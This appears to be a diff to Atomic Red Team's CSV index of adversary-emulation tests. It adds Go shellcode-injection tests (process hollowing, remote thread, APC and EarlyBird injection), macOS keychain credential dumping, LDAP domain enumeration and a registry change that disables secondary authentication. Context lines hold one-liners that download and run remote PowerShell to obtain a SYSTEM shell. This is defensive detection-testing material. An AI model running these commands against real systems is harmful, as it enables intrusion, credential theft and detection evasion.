@@ -484,6 +484,17 @@ input_arguments.output_file.default: %tmp%\T1106.exe
 T1106,Native API,WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,ce4e76e6-de70-4392-9efe-b281fc2b4087,Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1'),powershell,,,,,,
 T1106,Native API,WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,7ec5b74e-8289-4ff2-a162-b6f286a33abd,Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1'),powershell,,,,,,
 T1106,Native API,WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,e1f93a06-1649-4f07-89a8-f57279a7d60e,Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1'),powershell,,,,,,
+T1106,Native API,Run Shellcode via Syscall in Go,ae56083f-28d0-417d-84da-df4242da1f7c,"Runs shellcode in the current running process via a syscall.
+
+Steps taken with this technique
+1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+3. Change the memory page permissions to Execute/Read with VirtualProtect
+4. Use syscall to execute the entrypoint of the shellcode
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)
+",windows,,,"$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
+",powershell,False,,Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue,,,
 T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Add command to .bash_profile,94500ae1-7e31-47e3-886b-c328da46872f,"Adds a command to the .bash_profile file of the current user
 ",macos,linux,,"echo '#{command_to_add}' >> ~/.bash_profile
 ",sh,,,"head -n '-2' ~/.bash_profile > /tmp/T1546.004
@@ -602,21 +613,27 @@ dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolde
 Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe"" ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true""
 
 ",
-T1555.001,Credentials from Password Stores: Keychain,Keychain,1864fdec-ff86-4452-8c30-f12507582a93,"### Keychain Files
+T1555.001,Credentials from Password Stores: Keychain,Keychain Dump,88e1fa00-bf63-4e5b-a3e1-e2ea51c8cca6,"This command will dump keychain credential information from login.keychain. 
+Source: https://www.loobins.io/binaries/security/
 
+### Keychain File path
   ~/Library/Keychains/
-
   /Library/Keychains/
-
   /Network/Library/Keychains/
-
   [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)
+  ",macos,,,sudo security dump-keychain -d login.keychain,sh,True,,,,,
+T1555.001,Credentials from Password Stores: Keychain,Export Certificate Item(s),1864fdec-ff86-4452-8c30-f12507582a93,"This command finds all certificate items and sends the output to local file in pem format.
+",macos,,,"security find-certificate -a -p > #{cert_export}
+",sh,False,,rm #{cert_export},,,"input_arguments.cert_export.description: Specify the path of the certificates to export.
 
-  [Keychain dumper](https://github.com/juuso/keychaindump)
-",macos,,,"security -h
-security find-certificate -a -p > #{cert_export}
-security import #{cert_export} -k
-",sh,,,,,,"input_arguments.cert_export.description: Specify the path of the certificates to export.
+input_arguments.cert_export.type: path
+
+input_arguments.cert_export.default: /tmp/certs.pem
+
+"
+T1555.001,Credentials from Password Stores: Keychain,Import Certificate Item(s) into Keychain,e544bbcb-c4e0-4bd0-b614-b92131635f59,"This command will import a certificate pem file into a keychain.
+",macos,,,"security import #{cert_export} -k
+",sh,False,,,,,"input_arguments.cert_export.description: Specify the path of the pem certificate file to import.
 
 input_arguments.cert_export.type: path
 
@@ -3453,6 +3470,43 @@ dependencies.0.get_prereq_command: Write-Host ""You will need to install Microso
 input_arguments.ms_product.type: string
 
 input_arguments.ms_product.default: Word
+
+"
+T1055.012,Process Injection: Process Hollowing,Process Hollowing in Go using CreateProcessW WinAPI,c8f98fe1-c89b-4c49-a7e3-d60ee4bc2f5a,"Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)
+",windows,,,"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program ""#{hollow_binary_path}"" -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+Stop-Process -Name ""#{hollow_process_name}"" -ErrorAction SilentlyContinue
+",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow
+
+input_arguments.hollow_binary_path.type: string
+
+input_arguments.hollow_binary_path.default: C:\Windows\System32\werfault.exe
+
+input_arguments.hollow_process_name.description: Name of the process to hollow
+
+input_arguments.hollow_process_name.type: string
+
+input_arguments.hollow_process_name.default: werfault
+
+"
+T1055.012,Process Injection: Process Hollowing,Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012),94903cc5-d462-498a-b919-b1e5ab155fee,"Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.
+This test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe
+allows for the retrieval of output generated from executed shellcode.
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)
+",windows,,,"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""#{hollow_binary_path}"" -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+Stop-Process -Name ""#{hollow_process_name}"" -ErrorAction SilentlyContinue",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow
+
+input_arguments.hollow_binary_path.type: string
+
+input_arguments.hollow_binary_path.default: C:\Windows\System32\werfault.exe
+
+input_arguments.hollow_process_name.description: Name of the process to hollow
+
+input_arguments.hollow_process_name.type: string
+
+input_arguments.hollow_process_name.default: werfault
 
 "
 T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,Persistence via WMI Event Subscription - CommandLineEventConsumer,3c64f177-28e2-49eb-a799-d767b24dd1e0,"Run from an administrator powershell window. After running, reboot the victim machine.
@@ -6307,6 +6361,41 @@ input_arguments.password.description: password of the user with admin privileges
 input_arguments.password.type: string
 
 input_arguments.password.default: s3CurePssw0rD!
+
+"
+T1087.002,Account Discovery: Domain Account,Account Enumeration with LDAPDomainDump,a54d497e-8dbe-4558-9895-44944baa395f,"This test uses LDAPDomainDump to perform account enumeration on a domain.
+[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)
+",linux,,,ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087,sh,False,,"rm -rf /tmp/T1087/ 2>/dev/null 
+",sh,"dependencies.0.description: Python3 must be installed
+dependencies.0.prereq_command: if [ -x ""$(command -v python3 --version)"" ]; then exit 0; else exit 1; fi;
+dependencies.0.get_prereq_command: sudo apt-get -y install python3
+dependencies.1.description: Pip must be installed
+dependencies.1.prereq_command: if [ -x ""$(command -v pip --version)"" ]; then exit 0; else exit 1; fi;
+dependencies.1.get_prereq_command: wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py
+python3 /tmp/get-pip.py
+dependencies.2.description: The ldapdomaindump module must be installed
+dependencies.2.prereq_command: python3 -c 'import ldapdomaindump' 2>/dev/null
+dependencies.2.get_prereq_command: pip install ldapdomaindump
+dependencies.3.description: The future module must be installed
+dependencies.3.prereq_command: python3 -c 'import future' 2>/dev/null
+dependencies.3.get_prereq_command: pip install future
+","input_arguments.username.description: Username and domain to authenticate with
+
+input_arguments.username.type: string
+
+input_arguments.username.default: domain\user
+
+input_arguments.target_ip.description: IP to connect to
+
+input_arguments.target_ip.type: string
+
+input_arguments.target_ip.default: 127.0.0.1
+
+input_arguments.password.description: Password to authenticate with
+
+input_arguments.password.type: string
+
+input_arguments.password.default: password
 
 "
 T1547.003,Time Providers,Create a new time provider,df1efab7-bc6d-4b88-8be9-91f55ae017aa,"Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
@@ -11523,6 +11612,149 @@ input_arguments.vuln_dll.type: path
 input_arguments.vuln_dll.default: PathToAtomicsFolder\T1055\bin\x64\vuln_dll\msys-2.0.dll
 
 "
+T1055,Process Injection,Process Injection with Go using UuidFromStringA WinAPI,2315ce15-38b6-46ac-a3eb-5e21abef2545,"Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.
+With this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread 
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)
+- References: 
+  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
+  - https://twitter.com/_CPResearch_/status/1352310521752662018
+  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
+",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+",,,
+T1055,Process Injection,Process Injection with Go using EtwpCreateEtwThread WinAPI,7362ecef-6461-402e-8716-7410e1566400,"Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.
+This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
+
+Steps taken with this technique
+1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+3. Change the memory page permissions to Execute/Read with VirtualProtect
+4. Call EtwpCreateEtwThread on shellcode address
+5. Call WaitForSingleObject so the program does not end before the shellcode is executed
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)
+- References: 
+  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
+  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm
+",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+",,,
+T1055,Process Injection,Remote Process Injection with Go using RtlCreateUserThread WinAPI,a0c1725f-abcd-40d6-baac-020f3cf94ecd,"Executes shellcode in a remote process.
+
+Steps taken with this technique
+1. Get a handle to the target process
+2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
+3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
+4. Change the memory page permissions to Execute/Read with VirtualProtectEx
+5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread
+6. Close the handle to the remote process
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)
+- References: 
+  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike
+",windows,,,"$process = Start-Process #{spawn_process_path} -passthru
+$PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn
+
+input_arguments.spawn_process_path.type: string
+
+input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe
+
+input_arguments.spawn_process_name.description: Name of the process spawned
+
+input_arguments.spawn_process_name.type: string
+
+input_arguments.spawn_process_name.default: werfault
+
+"
+T1055,Process Injection,Remote Process Injection with Go using CreateRemoteThread WinAPI,69534efc-d5f5-4550-89e6-12c6457b9edd,"Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.
+
+This application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().
+
+Steps taken with this technique
+1. Get a handle to the target process
+2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
+3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
+4. Change the memory page permissions to Execute/Read with VirtualProtectEx
+5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
+6. Close the handle to the remote process
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)
+ - References:
+  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
+",windows,,,"$process = Start-Process #{spawn_process_path} -passthru
+$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn
+
+input_arguments.spawn_process_path.type: string
+
+input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe
+
+input_arguments.spawn_process_name.description: Name of the process spawned
+
+input_arguments.spawn_process_name.type: string
+
+input_arguments.spawn_process_name.default: werfault
+
+"
+T1055,Process Injection,Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39,"Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.
+
+This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
+
+1. Get a handle to the target process
+2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
+3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
+4. Change the memory page permissions to Execute/Read with VirtualProtectEx
+5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
+6. Close the handle to the remote process
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)
+",windows,,,"$process = Start-Process #{spawn_process_path} -passthru
+$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn
+
+input_arguments.spawn_process_path.type: string
+
+input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe
+
+input_arguments.spawn_process_name.description: Name of the process spawned
+
+input_arguments.spawn_process_name.type: string
+
+input_arguments.spawn_process_name.default: werfault
+
+"
+T1055,Process Injection,Process Injection with Go using CreateThread WinAPI,2871ed59-3837-4a52-9107-99500ebc87cb,"This program executes shellcode in the current process using the following steps
+1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+3. Change the memory page permissions to Execute/Read with VirtualProtect
+4. Call CreateThread on shellcode address
+5. Call WaitForSingleObject so the program does not end before the shellcode is executed
+
+This program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)
+",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+",,,
+T1055,Process Injection,Process Injection with Go using CreateThread WinAPI (Natively),2a3c7035-d14f-467a-af94-933e49fe6786,"This program executes shellcode in the current process using the following steps
+1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+3. Change the memory page permissions to Execute/Read with VirtualProtect
+4. Call CreateThread on shellcode address
+5. Call WaitForSingleObject so the program does not end before the shellcode is executed
+
+This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)
+",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug
+",powershell,False,,Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue,,,
 T1098,Account Manipulation,Admin Account Manipulate,5598f7cb-cf43-455e-883a-f6008c5d46af,"Manipulate Admin Account Name
 ",windows,,,"$x = Get-Random -Minimum 2 -Maximum 9999
 $y = Get-Random -Minimum 2 -Maximum 9999
@@ -13619,6 +13851,48 @@ input_arguments.exe_binary.type: path
 input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.004\bin\T1055.exe
 
 "
+T1055.004,Process Injection: Asynchronous Procedure Call,EarlyBird APC Queue Injection in Go,73785dd2-323b-4205-ab16-bb6f06677e14,"Creates a process in a suspended state and calls QueueUserAPC WinAPI to add a UserAPC to the child process that points to allocated shellcode. 
+ResumeThread is called which then calls NtTestAlert to execute the created UserAPC which then executes the shellcode.
+This technique allows for the early execution of shellcode and potentially before AV/EDR can hook functions to support detection.
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)
+- References: 
+  - https://www.bleepingcomputer.com/news/security/early-bird-code-injection-technique-helps-malware-stay-undetected/
+  - https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
+",windows,,,"$PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program ""#{spawn_process_path}"" -debug
+",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+Stop-Process -Name ""#{spawn_process_name}"" -ErrorAction SilentlyContinue
+",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn
+
+input_arguments.spawn_process_path.type: string
+
+input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe
+
+input_arguments.spawn_process_name.description: Name of the process to spawn
+
+input_arguments.spawn_process_name.type: string
+
+input_arguments.spawn_process_name.default: werfault
+
+"
+T1055.004,Process Injection: Asynchronous Procedure Call,Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,4cc571b1-f450-414a-850f-879baf36aa06,"Uses the undocumented NtQueueAPCThreadEx WinAPI to create a ""Special User APC"" in the current thread of the current process to execute shellcode. 
+Since the shellcode is loaded and executed in the current process it is considered local shellcode execution.
+
+Steps taken with this technique
+1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+3. Change the memory page permissions to Execute/Read with VirtualProtect
+4. Get a handle to the current thread
+5. Execute the shellcode in the current thread by creating a Special User APC through the NtQueueApcThreadEx function
+
+- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)
+- References:
+  - https://repnz.github.io/posts/apc/user-apc/
+  - https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html
+  - https://0x00sec.org/t/process-injection-apc-injection/24608
+  - https://twitter.com/aionescu/status/992264290924032005
+  - http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505
+",windows,,,"$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+",powershell,False,,Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue,,,
 T1543.001,Create or Modify System Process: Launch Agent,Launch Agent,a5983dee-bf6c-4eaf-951c-dbc1a7b90900,"Create a plist and execute it
 ",macos,,,"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
 sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
@@ -14219,6 +14493,11 @@ Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet
 ",powershell,,,"# Restore the registry values for http and https to 3
 Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 3
 Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 3
+",,,
+T1112,Modify Registry,Activities To Disable Secondary Authentication Detected By Modified Registry Value.,c26fb85a-fa50-4fab-a64a-c51f5dc538d5,"Detect the disable secondary authentication activities that adversary attempt to bypass MFA and to get the unauthorized access to the system or sensitive data.
+See the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.SecondaryAuthenticationFactor::MSSecondaryAuthFactor_AllowSecondaryAuthenticationDevice).
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor"" /v ""AllowSecondaryAuthenticationDevice"" /t REG_DWORD /d 0 /f
+",command_prompt,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor"" /v ""AllowSecondaryAuthenticationDevice"" /t REG_DWORD /d 1 /f
 ",,,
 T1055.011,Process Injection: Extra Window Memory Injection,Process Injection via Extra Window Memory (EWM) x64 executable,93ca40d2-336c-446d-bcef-87f14d438018,Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique,windows,,,#{exe_binary},powershell,False,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})
 dependencies.0.prereq_command: if (Test-Path #{exe_binary}) {exit 0} else {exit 1}
